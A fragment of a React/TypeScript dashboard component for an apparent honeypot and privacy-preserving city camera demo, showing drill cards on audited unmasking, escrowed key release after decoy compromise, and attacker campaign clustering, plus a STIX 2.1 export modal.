            </h4>
            <p style={{ color: '#cbd5e1', fontSize: '0.9rem' }}>
              A pedestrian is flagged by the camera edge model. The live feed remains blurred. Because no honeypot hostility has been recorded, no break-glass warrant can be issued.
            </p>
            <div className="drill-guide-quote">
              When an operator attempts an unauthorized unmasking, the request is rejected with 403 Forbidden, and the attempt is permanently written into the immutable audit trail.
            </div>
          </div>

          <div className="drill-guide-card">
            <h4>
              <span className="status-chip pending">DRILL B</span> Real Decoy Compromise & Escrow Unlock
            </h4>
            <p style={{ color: '#cbd5e1', fontSize: '0.9rem' }}>
              A scripted attacker brute-forces the decoy SSH service and touches a honeytoken bait file (rickroll fires). The hostility threshold is crossed.
            </p>
            <div className="drill-guide-quote">
              2 of 3 municipal custodians approve the case. The audit entry is committed BEFORE releasing the key. Only that camera and 10-minute window unlock—never a blanket unmask!
            </div>
          </div>

          <div className="drill-guide-card">
            <h4>
              <span className="status-chip approved">DRILL C</span> Campaign Clustering Signature Moment
            </h4>
            <p style={{ color: '#cbd5e1', fontSize: '0.9rem' }}>
              Three scripted attacker groups hit the decoys from rotating IPs. The intelligence engine correlates them by strong evidence (C2 address, malware binary hash, and dropper sequence).
            </p>
            <div className="drill-guide-quote">
              Even when an attacker adapts mid-drill by rotating their IP and dictionary, the reused C2 links them with plain-language explanations on every edge!
            </div>
          </div>

          <div
            style={{
              padding: '1.25rem',
              borderRadius: 'var(--radius-lg)',
              background: 'linear-gradient(135deg, rgba(56, 189, 248, 0.1), rgba(99, 102, 241, 0.15))',
              border: '1px solid var(--border-accent)',
            }}
          >
            <span className="field-label" style={{ color: '#38bdf8' }}>Judges Closing Statement</span>
            <p style={{ fontSize: '1.05rem', fontWeight: 600, color: '#ffffff', marginTop: '0.4rem', fontStyle: 'italic' }}>
              "We don't claim to identify a person. We identify campaigns, score them by what they could cascade into across city infrastructure, and never unmask a citizen without a verified, scoped, multi-party-approved reason."
            </p>
          </div>
        </div>
      )}

      {/* STIX 2.1 JSON Modal */}
      {stixModalOpen && (
        <div className="stix-modal-backdrop" onClick={() => setStixModalOpen(false)}>
          <div className="stix-modal-card" onClick={(e) => e.stopPropagation()}>
            <div className="stix-modal-header">
              <div>
                <span className="field-label">OASIS Standard CTI</span>
                <h3 style={{ fontSize: '1rem', color: '#fff' }}>STIX 2.1 Threat Intelligence Bundle</h3>
              </div>
              <div style={{ display: 'flex', gap: '0.5rem' }}>
                <button
                  type="button"
                  className="btn-drill"
                  onClick={handleDownloadSTIXFile}
                  style={{ fontSize: '0.75rem' }}
                >
                  Download .json
                </button>
                <button
                  type="button"
                  onClick={() => setStixModalOpen(false)}
                  style={{ background: 'transparent', border: 'none', color: '#94a3b8', cursor: 'pointer', fontSize: '1.2rem' }}
                >
                  ✕
                </button>
              </div>
            </div>
            <pre className="stix-modal-content">{stixContent}</pre>
          </div>
        </div>
      )}
    </div>
  )
}

function hashlib_preview(strVal: string): string {
  let hash = 0
  for (let i = 0; i < strVal.length; i++) {
    hash = (hash << 5) - hash + strVal.charCodeAt(i)
    hash |= 0
  }
  return Math.abs(hash).toString(16).padStart(8, '0') + 'f9a2...'
}
